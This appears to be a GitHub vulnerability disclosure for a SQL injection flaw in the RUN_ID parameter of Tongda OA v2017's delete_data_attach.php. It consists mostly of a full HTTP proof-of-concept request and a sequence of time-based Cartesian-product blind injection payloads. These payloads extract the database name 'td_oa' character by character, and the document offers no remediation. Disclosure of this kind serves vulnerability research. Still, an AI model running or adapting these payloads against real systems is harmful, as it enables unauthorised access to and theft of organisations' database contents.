SQL injection vulnerability exists in Tongda OA v2017 version

Route:/general/approve_center/query/list/input_form/delete_data_attach.php

There is an injected parameter: $RUN_ID

The code here is very concise. When $RUN_ID is not empty, the parameters are directly spliced ​​into the SQL statement. Since the parentheses are closed here, there is a bypass.

![image](https://github.com/18333199082/cve/assets/66902364/5f476875-2e96-4d38-b15d-247a6014a006)

POC

```
GET /general/approve_center/query/list/input_form/delete_data_attach.php?RUN_ID=1%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B) HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: USER_NAME_COOKIE=admin; SID_1=731fd63a; PHPSESSID=9n4hhfpii6p3elru0pcfs77ta5; OA_USER_ID=admin
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
```
2.Payload
We can use Cartesian product blind injection for injection. The following payload can determine that the first character of the database name is t, because it was successfully delayed at 116. The ASCII code 116 also corresponds to the lowercase letter t. By analogy, the database name and any information about the database can be obtained through blind injection.
```
1%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)
```
![image](https://github.com/18333199082/cve/assets/66902364/97a877cc-723e-47a3-b7b9-b2ca8f5c93f5)

Intercept the second digit of the database through blind injection, and determine the second digit as the letter d through the delay time
```
1%20and%20(substr(DATABASE(),2,1))=char(100)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)
```
![image](https://github.com/18333199082/cve/assets/66902364/79f7939a-1d85-4c23-9d5e-82d345696c66)

The third digit is the character _

```
1%20and%20(substr(DATABASE(),3,1))=char(95)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)
```
![image](https://github.com/18333199082/cve/assets/66902364/d1734ff0-aeb9-4741-9cec-377abed41a1f)

The fourth digit is the character o
```
1%20and%20(substr(DATABASE(),4,1))=char(111)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)
```
![image](https://github.com/18333199082/cve/assets/66902364/a99dcc95-dd24-4d30-b1ae-198d06bbe965)

The fifth digit is the character a

```
1%20and%20(substr(DATABASE(),5,1))=char(97)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)
```
![image](https://github.com/18333199082/cve/assets/66902364/959d0d71-7eba-41de-89a7-f83b53ced08d)

Then through blind injection, you can determine that the database name is: td_oa



